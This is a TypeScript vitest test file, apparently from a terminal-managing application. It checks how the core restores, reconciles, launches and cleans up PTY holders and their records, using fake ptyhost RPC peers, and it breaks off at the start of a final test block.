import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { noopLogger, runDir, type Clock } from '@kea/kit'
import { channelPair, L, ptyhostApi, RpcPeer, type PtyInfo } from '@kea/protocol'
import { describe, expect, it } from 'vitest'
import { VisibleSet } from '../platform/visible.ts'
import { MemoryRecords, type TerminalRecord } from './records.ts'
import { Terminals, type TerminalExit } from './terminals.ts'

const info = (ptyId: string, over: Partial<PtyInfo> = {}): PtyInfo => ({
  ptyId,
  sessionId: 'shells',
  kind: 'shell',
  state: 'running',
  holderPid: 10,
  holderStartedAt: 1,
  childPid: 11,
  cwd: '/tmp',
  argv: ['/bin/zsh', '-l'],
  cols: 80,
  rows: 24,
  exitCode: null,
  exitSignal: null,
  detached: false,
  title: null,
  ...over,
})

const record = (ptyId: string, sessionId: string, over: Partial<TerminalRecord> = {}): TerminalRecord => ({
  ptyId,
  sessionId,
  kind: 'shell',
  argv: ['/bin/zsh', '-l'],
  cwd: '/tmp',
  title: null,
  holderPid: 10,
  holderStartedAt: 1,
  childPid: 11,
  cols: 80,
  rows: 24,
  state: 'running',
  exitCode: null,
  exitSignal: null,
  tabOrder: 0,
  createdAt: 1,
  endedAt: null,
  ...over,
})

/** A stand-in ptyhost whose `pty.list` answers only when released. */
function fakePtyhost(list: PtyInfo[]) {
  const [coreSide, ptyhostSide] = channelPair()
  let release!: () => void
  const gate = new Promise<void>((r) => (release = r))
  const peer = new RpcPeer(ptyhostSide, {
    name: 'fake-ptyhost',
    api: ptyhostApi,
    handlers: {
      'pty.configure': async () => ({ ok: true }),
      'pty.setVisible': async () => ({ ok: true }),
      'pty.list': async () => {
        await gate
        return list
      },
    } as never,
  })
  return { coreSide, release, peer }
}

describe('core terminals: startup restore', () => {
  it('U-PTY-15 · terminal.restored answers only after ptyhost has listed the surviving PTYs, with the running shell count', async () => {
    const t = new Terminals({ version: '0.0.0', log: noopLogger, env: async () => ({}) })
    const handler = t.handlers()['terminal.restored'] as (a: object, ctx: never) => Promise<{ shells: number; sessions: number }>
    const restored = handler({}, { signal: new AbortController().signal } as never)
    let answer: { shells: number; sessions: number } | null = null
    void restored.then((r) => (answer = r))
    await Promise.resolve()
    expect(answer, 'no answer before ptyhost is even connected').toBeNull()
    const ph = fakePtyhost([info('aaaaaaaaaa'), info('bbbbbbbbbb', { state: 'exited' }), info('cccccccccc', { kind: 'agent' }), info('dddddddddd')])
    t.setControl(ph.coreSide)
    await new Promise((r) => setTimeout(r, 0))
    expect(answer, 'no answer while pty.list is pending (a timer would open an extra shell here)').toBeNull()
    ph.release()
    expect(await restored).toEqual({ shells: 2, sessions: 0 })
    expect([...t.store.values()].map((i) => i.ptyId).sort()).toEqual(['aaaaaaaaaa', 'bbbbbbbbbb', 'cccccccccc', 'dddddddddd'])
    t.dispose()
    ph.peer.dispose()
  })

  it('U-PTY-67 · terminal.restored also says how many sessions have a terminal once reconciled, running or ended: the sessions a database rebuild brought back are among them, though a window’s first `sessions` snapshot may not list them', async () => {
    const records = new MemoryRecords([
      record('aaaaaaaaaa', 's1', { kind: 'agent' }),
      record('bbbbbbbbbb', 's1'),
      record('cccccccccc', 's2', { kind: 'agent' }),
      record('eeeeeeeeee', 'shells'),
    ])
    // s1's agent and shell tab run; s2's agent has no holder any more (it ends at reconciliation); one plain shell
    const ph = recordingPtyhost([info('aaaaaaaaaa', { sessionId: 's1', kind: 'agent' }), info('bbbbbbbbbb', { sessionId: 's1' }), info('eeeeeeeeee')])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records })
    t.setControl(ph.coreSide)
    expect(await call(t, 'terminal.restored', {})).toEqual({ shells: 2, sessions: 2 })
    expect(t.store.get('cccccccccc')).toMatchObject({ sessionId: 's2', state: 'lost' })
    t.dispose()
    ph.peer.dispose()

    // nothing of a session: only the shells pane's own tabs
    const alone = recordingPtyhost([info('eeeeeeeeee')])
    const t2 = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records: new MemoryRecords([record('eeeeeeeeee', 'shells')]) })
    t2.setControl(alone.coreSide)
    expect(await call(t2, 'terminal.restored', {})).toEqual({ shells: 1, sessions: 0 })
    t2.dispose()
    alone.peer.dispose()
  })

  it('U-PTY-47 · a restarted core lists its recorded terminals at once: the store is never empty while ptyhost answers, and reconciliation updates them in place', async () => {
    const records = new MemoryRecords([record('aaaaaaaaaa', 'shells'), record('bbbbbbbbbb', 'shells', { tabOrder: 1, title: 'vim' })])
    const t = new Terminals({ version: '0.0.0', log: noopLogger, env: async () => ({}), records })
    const deleted: string[] = []
    t.store.onDelta((d) => deleted.push(...(d.del ?? [])))
    // before any control port: the renderer's first snapshot already has both tabs (terminals unaffected)
    expect([...t.store.keys()].sort()).toEqual(['aaaaaaaaaa', 'bbbbbbbbbb'])
    expect(t.store.get('bbbbbbbbbb')).toMatchObject({ state: 'running', title: 'vim' })
    const ph = fakePtyhost([info('aaaaaaaaaa', { holderPid: 10, childPid: 11, detached: true, title: 'zsh' }), info('bbbbbbbbbb', { title: 'vim' })])
    t.setControl(ph.coreSide)
    await new Promise((r) => setTimeout(r, 0))
    expect([...t.store.keys()].sort(), 'still listed while pty.list is pending').toEqual(['aaaaaaaaaa', 'bbbbbbbbbb'])
    ph.release()
    await (t.handlers()['terminal.restored'] as (a: object, ctx: never) => Promise<unknown>)({}, { signal: new AbortController().signal } as never)
    expect(t.store.get('aaaaaaaaaa')).toMatchObject({ detached: true, title: 'zsh' })
    expect(deleted, 'no tab disappeared and came back').toEqual([])
    t.dispose()
    ph.peer.dispose()
  })
})

/** A stand-in ptyhost that lists `holders` and records every call; a hang-up or terminate ends the PTY with a note. */
function recordingPtyhost(holders: PtyInfo[]) {
  const [coreSide, ptyhostSide] = channelPair()
  const calls: { m: string; a: Record<string, unknown> }[] = []
  const waiting: { m: string; resolve(): void }[] = [] // bounded: one per `called` a test awaits
  /** What `pty.stat` answers per PTY (the foreground pid and name); none: ptyhost cannot tell. */
  const foreground = new Map<string, { pid: number; name: string }>() // bounded: the test's PTYs
  const noted = (m: string, a: Record<string, unknown>) => {
    calls.push({ m, a })
    for (const w of waiting.splice(0)) (w.m === m ? w.resolve : () => waiting.push(w))()
  }
  const rec = (m: string) => async (a: Record<string, unknown>) => {
    noted(m, a)
    return { ok: true }
  }
  const end = (ptyId: string, code: number | null = 0, signal: number | null = null) => {
    const h = holders.find((x) => x.ptyId === ptyId)
    if (!h) return
    h.state = 'exited'
    h.exitCode = code
    h.exitSignal = signal
    peer.notify('pty.exit', { ptyId, sessionId: h.sessionId, code, signal, lost: false })
  }
  const peer: RpcPeer = new RpcPeer(ptyhostSide, {
    name: 'fake-ptyhost',
    api: ptyhostApi,
    handlers: {
      'pty.configure': rec('pty.configure'),
      'pty.setVisible': rec('pty.setVisible'),
      'pty.clear': rec('pty.clear'),
      'pty.release': rec('pty.release'),
      'pty.input': rec('pty.input'),
      'pty.list': async () => holders.map((h) => ({ ...h })),
      'pty.stat': async (a: { ptyId: string }) => {
        noted('pty.stat', a)
        const fg = foreground.get(a.ptyId)
        return fg ? { childPid: 11, fgPid: fg.pid, fgName: fg.name, cwd: '/tmp', descendants: [] } : null
      },
      'pty.signal': async (a: { ptyId: string }) => {
        noted('pty.signal', a)
        end(a.ptyId)
        return { ok: true }
      },
      'pty.terminate': async (a: { ptyId: string }) => {
        noted('pty.terminate', a)
        end(a.ptyId)
        return { ok: true }
      },
    } as never,
  })
  return {
    coreSide,
    calls,
    peer,
    end,
    foreground,
    /** Resolves at the next call of `m`. */
    called: (m: string) => new Promise<void>((resolve) => waiting.push({ m, resolve })),
    touched: (ptyId: string) => calls.filter((c) => c.a.ptyId === ptyId || (c.a.ptyIds as string[] | undefined)?.includes(ptyId)),
  }
}

const call = <T>(t: Terminals, m: string, a: object): Promise<T> => (t.handlers() as Record<string, (a: object, ctx: never) => Promise<T>>)[m]!(a, { signal: new AbortController().signal } as never)

describe('core terminals: launch reconciliation', () => {
  it('U-PTY-44 · a holder whose record names another session is never attached: setVisible, clear and close never reach it; Terminate does', async () => {
    const records = new MemoryRecords([record('aaaaaaaaaa', 'S2')])
    const ph = recordingPtyhost([info('aaaaaaaaaa')])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records })
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    expect(t.store.get('aaaaaaaaaa')?.state, 'the record had no holder of its own').toBe('lost')
    expect(records.get('aaaaaaaaaa')?.state).toBe('lost')
    expect(t.orphans.get('aaaaaaaaaa')).toMatchObject({ reason: 'sessionMismatch', reachable: true, canAdopt: false, sessionId: 'shells' })

    expect(await call(t, 'terminal.setVisible', { ptyIds: ['aaaaaaaaaa'] })).toEqual({ ok: true })
    expect(await call(t, 'terminal.clear', { ptyId: 'aaaaaaaaaa' })).toEqual({ ok: false })
    await expect(call(t, 'terminal.adoptOrphan', { ptyId: 'aaaaaaaaaa' })).rejects.toMatchObject({ code: 'refused' })
    await expect(call(t, 'terminal.adoptOrphan', { ptyId: 'zzzzzzzzzz' })).rejects.toMatchObject({ code: 'not_found' })
    await expect(call(t, 'terminal.terminateOrphan', { ptyId: 'zzzzzzzzzz' })).rejects.toMatchObject({ code: 'not_found' })
    expect(await call(t, 'terminal.close', { ptyId: 'aaaaaaaaaa' })).toEqual({ ok: true })
    expect(ph.touched('aaaaaaaaaa'), 'nothing reached the mismatched holder').toEqual([])
    expect(records.get('aaaaaaaaaa')).toBeUndefined()
    expect(t.orphans.get('aaaaaaaaaa'), 'closing the record leaves the holder listed').toBeDefined()

    expect(await call(t, 'terminal.terminateOrphan', { ptyId: 'aaaaaaaaaa' })).toEqual({ ok: true })
    expect(ph.touched('aaaaaaaaaa').map((c) => c.m)).toEqual(['pty.signal', 'pty.release'])
    expect(t.orphans.size).toBe(0)
    t.dispose()
    ph.peer.dispose()
  })

  it('U-PTY-44 · "Adopt as shell" turns a no-record orphan into an attached shell tab; exits are recorded', async () => {
    const records = new MemoryRecords([])
    const ph = recordingPtyhost([info('bbbbbbbbbb', { sessionId: 'S7', kind: 'agent', title: 'old agent' })])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, now: () => 42 })
    t.setControl(ph.coreSide)
    expect(await call(t, 'terminal.restored', {})).toEqual({ shells: 0, sessions: 0 })
    expect(t.orphans.get('bbbbbbbbbb')).toMatchObject({ reason: 'noRecord', canAdopt: true })
    expect(t.store.size).toBe(0)
    expect(await call(t, 'terminal.adoptOrphan', { ptyId: 'bbbbbbbbbb' })).toEqual({ ptyId: 'bbbbbbbbbb' })
    expect(t.orphans.size).toBe(0)
    expect(t.store.get('bbbbbbbbbb')).toMatchObject({ kind: 'shell', sessionId: 'S7', state: 'running', title: 'old agent' })
    expect(records.get('bbbbbbbbbb')).toMatchObject({ kind: 'shell', sessionId: 'S7', state: 'running', createdAt: 42 })
    expect(await call(t, 'terminal.clear', { ptyId: 'bbbbbbbbbb' })).toEqual({ ok: true })
    expect(await call(t, 'terminal.close', { ptyId: 'bbbbbbbbbb' })).toEqual({ ok: true })
    expect(ph.touched('bbbbbbbbbb').map((c) => c.m)).toEqual(['pty.clear', 'pty.signal', 'pty.release'])
    expect(records.list()).toEqual([])
    t.dispose()
    ph.peer.dispose()
  })

  // ptyhost's list says "running" and the exit note comes while the holder scan waits on `ps`: a plan made from the
  // older list alone would end the record while the holder still reads "running", a "recordEnded" orphan that nothing
  // ever releases
  it('U-PTY-66 · an exit note that arrives between ptyhost’s list and the end of the holder scan is not lost: the PTY is attached as ended and its holder released, and an orphan reads `exited`', async () => {
    const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-u-pty-66-')))
    try {
      const records = new MemoryRecords([record('aaaaaaaaaa', 'S1', { kind: 'server' })])
      const ph = recordingPtyhost([info('aaaaaaaaaa', { sessionId: 'S1', kind: 'server' }), info('bbbbbbbbbb', { sessionId: 'S2' })])
      // the holder scan's `ps` answers only when the test lets it: the list has been answered by then
      let scanning!: () => void
      const scanStarted = new Promise<void>((r) => (scanning = r))
      let finishScan!: () => void
      const scanGate = new Promise<void>((r) => (finishScan = r))
      const probe = async () => {
        scanning()
        await scanGate
        return new Map()
      }
      const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, home, probe })
      const exits: TerminalExit[] = []
      t.exits.event((e) => exits.push(e))
      t.setControl(ph.coreSide)
      await scanStarted // ptyhost's list has been answered ("running", both) and the scan is out
      // both die now: their exit notes reach core while the scan is still out
      const noted = new Promise<void>((r) => t.exits.event(() => r()))
      ph.end('bbbbbbbbbb', 0, null)
      ph.end('aaaaaaaaaa', null, 9)
      await noted
      expect(records.get('aaaaaaaaaa')).toMatchObject({ state: 'exited', exitSignal: 9 })
      const released = ph.called('pty.release')
      finishScan()
      await call(t, 'terminal.restored', {})

      expect(t.orphans.get('aaaaaaaaaa'), 'its own ended PTY is not an orphan').toBeUndefined()
      expect(t.store.get('aaaaaaaaaa')).toMatchObject({ state: 'exited', exitCode: null, exitSignal: 9 })
      // The lingering holder is let go, once
      await released
      expect(ph.touched('aaaaaaaaaa').map((c) => c.m)).toEqual(['pty.release'])
      expect(await t.waitExit('aaaaaaaaaa', 0)).toBe(true)
      expect(exits, 'one exit, from the note').toEqual([{ ptyId: 'aaaaaaaaaa', sessionId: 'S1', kind: 'server', state: 'exited', exitCode: null, exitSignal: 9 }])
      // a holder with no record is still an orphan, and it reads as what it is: ended
      expect(t.orphans.get('bbbbbbbbbb')).toMatchObject({ reason: 'noRecord', state: 'exited' })
      expect(ph.touched('bbbbbbbbbb'), 'reconciliation never acts on an orphan').toEqual([])
      t.dispose()
      ph.peer.dispose()
    } finally {
      fs.rmSync(runDir(home), { recursive: true, force: true })
      fs.rmSync(home, { recursive: true, force: true })
    }
  })
})

describe('core terminals: forgetting an ended record', () => {
  // a failed `pty.release` (ptyhost restarting) is not a release: the holder may still linger, and with its files
  // removed it would turn up as a "noRecord" orphan
  it('U-PTY-64 · an ended record whose holder’s release fails keeps its record and files for the next reconcile; once a release is confirmed, both go', async () => {
    const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-u-pty-64-')))
    try {
      const dir = path.join(home, 'sessions', 'S1')
      fs.mkdirSync(dir, { recursive: true })
      const files = ['ring', 'ckpt'].map((x) => path.join(dir, `aaaaaaaaaa.${x}`))
      for (const f of files) fs.writeFileSync(f, 'x')
      const records = new MemoryRecords([record('aaaaaaaaaa', 'S1', { kind: 'agent', state: 'exited', exitCode: 0, endedAt: 2 })])
      // a lingering holder of that record (child exited); its release fails until ptyhost can answer it
      let releases = 'fail'
      const [coreSide, ptyhostSide] = channelPair()
      const peer = new RpcPeer(ptyhostSide, {
        name: 'fake-ptyhost',
        api: ptyhostApi,
        handlers: {
          'pty.configure': async () => ({ ok: true }),
          'pty.setVisible': async () => ({ ok: true }),
          'pty.list': async () => [info('aaaaaaaaaa', { sessionId: 'S1', kind: 'agent', state: 'exited', exitCode: 0 })],
          'pty.release': async () => {
            if (releases === 'fail') throw new Error('ptyhost restarting')
            return { ok: true }
          },
        } as never,
      })
      const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, home })
      t.setControl(coreSide)
      await call(t, 'terminal.restored', {})
      await t.forgetRecord('aaaaaaaaaa', { files: true })
      expect({ record: records.get('aaaaaaaaaa')?.state ?? null, files: files.map((f) => fs.existsSync(f)) }, 'not released: kept').toEqual({ record: 'exited', files: [true, true] })
      releases = 'ok'
      await t.forgetRecord('aaaaaaaaaa', { files: true })
      expect({ record: records.get('aaaaaaaaaa')?.state ?? null, files: files.map((f) => fs.existsSync(f)) }, 'released: gone').toEqual({ record: null, files: [false, false] })
      t.dispose()
      peer.dispose()
    } finally {
      fs.rmSync(home, { recursive: true, force: true })
    }
  })

  /** A stand-in ptyhost that spawns holders: `pty.list` answers only when let, once `hold()` was called. */
  function spawningPtyhost(holders: PtyInfo[] = []) {
    const [coreSide, ptyhostSide] = channelPair()
    const calls: { m: string; ptyId: string }[] = []
    const waiting: { m: string; resolve(): void }[] = [] // bounded: one per `called` a test awaits
    let gate: Promise<void> | null = null
    let open: (() => void) | null = null
    let asked: (() => void) | null = null
    const noted = (m: string, ptyId: string) => {
      calls.push({ m, ptyId })
      for (const w of waiting.splice(0)) (w.m === m ? w.resolve : () => waiting.push(w))()
    }
    const rec = (m: string) => async (a: { ptyId: string }) => {
      noted(m, a.ptyId)
      return { ok: true }
    }
    const peer: RpcPeer = new RpcPeer(ptyhostSide, {
      name: 'fake-ptyhost',
      api: ptyhostApi,
      handlers: {
        'pty.configure': async () => ({ ok: true }),
        'pty.setVisible': async () => ({ ok: true }),
        'pty.spawn': async (a: { ptyId: string; sessionId: string; kind: PtyInfo['kind'] }) => {
          holders.push(info(a.ptyId, { sessionId: a.sessionId, kind: a.kind }))
          return { holderPid: 10, childPid: 11, detached: true }
        },
        'pty.list': async () => {
          asked?.()
          await gate
          return holders.map((h) => ({ ...h }))
        },
        'pty.signal': rec('pty.signal'),
        'pty.terminate': rec('pty.terminate'),
        'pty.release': async (a: { ptyId: string }) => {
          holders.splice(0, holders.length, ...holders.filter((h) => h.ptyId !== a.ptyId))
          noted('pty.release', a.ptyId)
          return { ok: true }
        },
      } as never,
    })
    return {
      coreSide,
      peer,
      calls,
      holders,
      /** Resolves at the next call of `m`. */
      called: (m: string) => new Promise<void>((resolve) => waiting.push({ m, resolve })),
      /** The next `pty.list` waits for `answer()`; resolves once it has been asked. */
      hold: (): Promise<void> => {
        gate = new Promise((r) => (open = r))
        return new Promise((r) => (asked = r))
      },
      answer: () => {
        gate = null
        asked = null
        open?.()
      },
      /** The child of `ptyId` exits now: its holder lingers, and core is told. */
      end: (ptyId: string, code: number) => {
        const h = holders.find((x) => x.ptyId === ptyId)!
        h.state = 'exited'
        h.exitCode = code
        peer.notify('pty.exit', { ptyId, sessionId: h.sessionId, code, signal: null, lost: false })
      },
    }
  }

  // an exit note that reaches core before `launch` has attached the PTY ends its record. Whoever hears that exit and
  // forgets the record (a teardown's terminal is forgotten when it ends) must not be told "no holder": the record and
  // its files would go while the holder lingers, and `launch` would write a stale copy of the record again and fire a
  // second exit event
  it('U-PTY-71 · a PTY whose child exits while it is still being launched is not released or forgotten until it is attached, ends once with its exit code, and a record that went meanwhile (its session was deleted) is not written again: its holder is ended instead', async () => {
    const ph = spawningPtyhost()
    const records = new MemoryRecords([])
    let banners = 0
    let bannered: (() => void) | null = null
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, onBanner: () => (banners++, bannered?.()) })
    const exits: TerminalExit[] = []
    t.exits.event((e) => exits.push(e))
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    /** Launch a script whose child exits (code 3) after the spawn call has returned and before the holder list answers. */
    const launchEnding = async (): Promise<{ ptyId: string; launched: Promise<{ ptyId: string }> }> => {
      const listAsked = ph.hold()
      const launched = t.launch({ sessionId: 'S1', kind: 'script', title: 'Teardown', command: { argv: ['/bin/sh', '-c', 'exit 3'] }, cwd: '/tmp', cols: 80, rows: 24 })
      await listAsked
      const ptyId = ph.holders.at(-1)!.ptyId
      // the exit note, and after it a note core passes on: once that one is here, the exit note has been read
      const seen = new Promise<void>((r) => (bannered = r))
      ph.end(ptyId, 3)
      ph.peer.notify('pty.banner', { kind: 'diskFull', message: 'a marker' })
      await seen
      return { ptyId, launched }
    }

    const a = await launchEnding()
    expect(await t.releaseEnded(a.ptyId), 'still launching: not released').toBe(false)
    await t.forgetRecord(a.ptyId, { files: true })
    expect(records.get(a.ptyId), 'still launching: not forgotten').toBeDefined()
    ph.answer()
    expect(await a.launched).toEqual({ ptyId: a.ptyId })
    expect(records.get(a.ptyId)).toMatchObject({ state: 'exited', exitCode: 3, exitSignal: null })
    expect(exits, 'one exit event').toEqual([{ ptyId: a.ptyId, sessionId: 'S1', kind: 'script', state: 'exited', exitCode: 3, exitSignal: null }])
    // attached now: its holder is released, then its record goes
    await t.forgetRecord(a.ptyId, { files: true })
    expect(records.get(a.ptyId)).toBeUndefined()
    expect(ph.calls).toEqual([{ m: 'pty.release', ptyId: a.ptyId }])

    // its session is deleted while it is being launched: the record that went stays gone, and its holder goes with it
    ph.calls.length = 0
    exits.length = 0
    const b = await launchEnding()
    await t.forgetSession('S1')
    expect(records.get(b.ptyId)).toBeUndefined()
    const released = ph.called('pty.release')
    ph.answer()
    await b.launched
    expect(records.get(b.ptyId), 'not written again').toBeUndefined()
    expect(t.store.get(b.ptyId)).toBeUndefined()
    expect(exits, 'nobody is told of a terminal that no longer exists').toEqual([])
    await released
    expect(ph.calls).toEqual([{ m: 'pty.release', ptyId: b.ptyId }])
    expect(ph.holders).toEqual([])
    expect(banners).toBe(2)
    t.dispose()
    ph.peer.dispose()
  })

  // before the first reconciliation core has no holder attached, and "not attached" is not "no holder": an ended record
  // forgotten then, files and all, would leave its holder lingering in ptyhost, an orphan from then on
  it('U-PTY-72 · before the first reconciliation an ended record is neither released nor forgotten (which holders exist is not known yet): its record and files stay; once reconciled, both go', async () => {
    const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-u-pty-72-')))
    try {
      const dir = path.join(home, 'sessions', 'S1')
      fs.mkdirSync(dir, { recursive: true })
      const files = ['ring', 'ckpt'].map((x) => path.join(dir, `aaaaaaaaaa.${x}`))
      for (const f of files) fs.writeFileSync(f, 'x')
      const left = () => ({ record: records.get('aaaaaaaaaa')?.state ?? null, files: files.map((f) => fs.existsSync(f)) })
      const records = new MemoryRecords([record('aaaaaaaaaa', 'S1', { kind: 'script', title: 'Teardown', state: 'exited', exitCode: 0, endedAt: 2 })])
      // its holder lingers in ptyhost, which has not answered core's first list yet
      const ph = spawningPtyhost([info('aaaaaaaaaa', { sessionId: 'S1', kind: 'script', state: 'exited', exitCode: 0 })])
      const listAsked = ph.hold()
      const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, home })
      t.setControl(ph.coreSide)
      await listAsked
      expect(await t.releaseEnded('aaaaaaaaaa'), 'not reconciled yet').toBe(false)
      await t.forgetRecord('aaaaaaaaaa', { files: true })
      expect(left(), 'not reconciled yet: kept').toEqual({ record: 'exited', files: [true, true] })
      expect(ph.calls, 'and its holder is not touched').toEqual([])
      ph.answer()
      await call(t, 'terminal.restored', {})
      await t.forgetRecord('aaaaaaaaaa', { files: true })
      expect(left(), 'reconciled: gone').toEqual({ record: null, files: [false, false] })
      expect(ph.holders).toEqual([])
      t.dispose()
      ph.peer.dispose()
    } finally {
      fs.rmSync(runDir(home), { recursive: true, force: true })
      fs.rmSync(home, { recursive: true, force: true })
    }
  })

  // the same holds for `close` and `forgetSession`: a running shell tab closed before the first reconciliation must not
  // lose its record and files while its holder runs on, never signalled
  it('U-PTY-73 · a tab closed, or a session forgotten, before the first reconciliation waits for it: nothing is forgotten and no file removed while the holders are unknown; then the holder is ended and released, and only then do record and files go', async () => {
    const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-u-pty-73-')))
    try {
      const dir = path.join(home, 'sessions', 'S1')
      fs.mkdirSync(dir, { recursive: true })
      const filesOf = (id: string) => ['ring', 'ckpt'].map((x) => path.join(dir, `${id}.${x}`))
      for (const f of [...filesOf('aaaaaaaaaa'), ...filesOf('bbbbbbbbbb')]) fs.writeFileSync(f, 'x')
      const left = (id: string) => ({ record: records.get(id)?.state ?? null, files: filesOf(id).map((f) => fs.existsSync(f)) })
      const records = new MemoryRecords([record('aaaaaaaaaa', 'S1', { kind: 'shell', state: 'running' }), record('bbbbbbbbbb', 'S2', { kind: 'script', title: 'Setup', state: 'exited', exitCode: 0, endedAt: 2 })])
      // both holders exist in ptyhost, which has not answered core's first list yet
      const ph = spawningPtyhost([info('aaaaaaaaaa', { sessionId: 'S1', kind: 'shell' }), info('bbbbbbbbbb', { sessionId: 'S2', kind: 'script', state: 'exited', exitCode: 0 })])
      const listAsked = ph.hold()
      const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, home })
      t.setControl(ph.coreSide)
      await listAsked
      let closed: { ok: boolean } | null = null
      let forgotten = false
      const closing = call<{ ok: boolean }>(t, 'terminal.close', { ptyId: 'aaaaaaaaaa' }).then((r) => (closed = r))
      const forgetting = t.forgetSession('S2').then(() => (forgotten = true))
      // every microtask and one turn of the loop: neither has gone ahead
      await new Promise((r) => setImmediate(r))
      expect([closed, forgotten], 'both wait').toEqual([null, false])
      expect(left('aaaaaaaaaa'), 'the running tab: kept').toEqual({ record: 'running', files: [true, true] })
      expect(records.get('bbbbbbbbbb')?.state, 'the ended script: kept').toBe('exited')
      expect(ph.calls, 'no holder is touched').toEqual([])
      // the shell answers its hang-up by exiting, as a shell does
      const hungUp = ph.called('pty.signal')
      ph.answer()
      await hungUp
      ph.end('aaaaaaaaaa', 0)
      await Promise.all([closing, forgetting])
      expect(closed).toEqual({ ok: true })
      // the tab's holder was ended and released before its record and files went; the ended script's holder was released
      expect(ph.calls.filter((c) => c.ptyId === 'aaaaaaaaaa').map((c) => c.m).at(-1)).toBe('pty.release')
      // (the reconciliation releases an ended record's lingering holder itself; a second release is answered the same)
      expect([...new Set(ph.calls.filter((c) => c.ptyId === 'bbbbbbbbbb').map((c) => c.m))]).toEqual(['pty.release'])
      expect(left('aaaaaaaaaa')).toEqual({ record: null, files: [false, false] })
      expect(records.get('bbbbbbbbbb')).toBeUndefined()
      expect(ph.holders).toEqual([])
      t.dispose()
      ph.peer.dispose()
    } finally {
      fs.rmSync(runDir(home), { recursive: true, force: true })
      fs.rmSync(home, { recursive: true, force: true })
    }
  })

  // ptyhost goes between `pty.spawn` and the list that follows it, while the holder it started lives on (detached): a
  // launch refused then would tell its caller (a session's agent, setup or teardown, a shell tab) that it failed,
  // though the next reconciliation attaches that PTY or ends it
  it('U-PTY-74 · a launch whose ptyhost goes after the spawn, before it has listed the PTY, is not refused while its PTY lives: it asks the next ptyhost (which has adopted the holder) and is answered as any launch, attached and running, or ended once with its exit; a holder the next ptyhost does not list is left to the reconciliation', async () => {
    const records = new MemoryRecords([])
    const reconciled: (() => void)[] = [] // bounded: one per connection the test waits on
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, onReconciled: () => reconciled.splice(0).forEach((r) => r()) })
    const exits: TerminalExit[] = []
    t.exits.event((e) => exits.push(e))
    let ph = spawningPtyhost()
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    /** Launch a PTY; ptyhost goes once the spawn has returned and the list has been asked. */
    const launchLosingPtyhost = async (): Promise<{ ptyId: string; launched: Promise<{ ptyId: string }>; outcome: () => string }> => {
      const listAsked = ph.hold()
      const launched = t.launch({ sessionId: 'S1', kind: 'agent', command: { argv: ['/bin/sh', '-c', 'sleep 9'] }, cwd: '/tmp', cols: 80, rows: 24 })
      let outcome = 'pending'
      launched.then(
        () => (outcome = 'resolved'),
        (e: Error) => (outcome = `rejected: ${e.message}`),
      )
      await listAsked
      const ptyId = ph.holders.at(-1)!.ptyId
      ph.peer.dispose() // ptyhost goes; the holder it started runs on (detached)
      // every microtask and one turn of the loop: the launch has heard that its ptyhost went
      await new Promise((r) => setImmediate(r))
      return { ptyId, launched, outcome: () => outcome }
    }
    /** The next ptyhost, which adopted the holders the last one left; resolves once core has reconciled with it. */
    const nextPtyhost = (): Promise<void> => {
      const done = new Promise<void>((r) => reconciled.push(r))
      ph = spawningPtyhost(ph.holders)
      t.setControl(ph.coreSide)
      return done
    }

    // the PTY runs on: once the next ptyhost lists it, the launch is answered, the PTY attached and running
    const a = await launchLosingPtyhost()
    expect(a.outcome(), 'not refused while its PTY lives').toBe('pending')
    expect(records.get(a.ptyId), 'its record stays').toMatchObject({ state: 'running' })
    expect(await t.releaseEnded(a.ptyId), 'still launching: not released').toBe(false)
    const back = nextPtyhost()
    expect(await a.launched).toEqual({ ptyId: a.ptyId })
    await back
    expect(t.store.get(a.ptyId), 'attached: ptyhost’s own view of it').toMatchObject({ state: 'running', holderPid: 10, childPid: 11 })
    expect(exits).toEqual([])
    // its exit, from the new ptyhost, ends its record once
    const heard = new Promise<void>((r) => t.exits.event(() => r()))
    ph.end(a.ptyId, 0)
    await heard
    expect(exits).toEqual([{ ptyId: a.ptyId, sessionId: 'S1', kind: 'agent', state: 'exited', exitCode: 0, exitSignal: null }])

    // its child exits while no ptyhost is there: the next one lists it ended, and the launch ends its record once
    exits.length = 0
    const b = await launchLosingPtyhost()
    expect(b.outcome()).toBe('pending')
    Object.assign(ph.holders.find((x) => x.ptyId === b.ptyId)!, { state: 'exited', exitCode: 3 })
    const backB = nextPtyhost()
    expect(await b.launched).toEqual({ ptyId: b.ptyId })
    await backB
    expect(records.get(b.ptyId)).toMatchObject({ state: 'exited', exitCode: 3, exitSignal: null })
    expect(exits, 'one exit event').toEqual([{ ptyId: b.ptyId, sessionId: 'S1', kind: 'agent', state: 'exited', exitCode: 3, exitSignal: null }])

    // its holder is gone with ptyhost (the next one adopts nothing for it): the launch is answered, and the
    // reconciliation that follows judges the record as any other with no holder (lost)
    exits.length = 0
    const c = await launchLosingPtyhost()
    expect(c.outcome()).toBe('pending')
    ph.holders.splice(ph.holders.findIndex((x) => x.ptyId === c.ptyId), 1)
    const backC = nextPtyhost()
    expect(await c.launched).toEqual({ ptyId: c.ptyId })
    await backC
    expect(t.store.get(c.ptyId)?.state).toBe('lost')
    t.dispose()
    ph.peer.dispose()
  })
})

describe('core terminals: a closed shell tab leaves nothing on disk', () => {
  // a closed shell tab of a session does not keep its ring and checkpoint until the session is deleted, one set per tab
  // ever opened in it
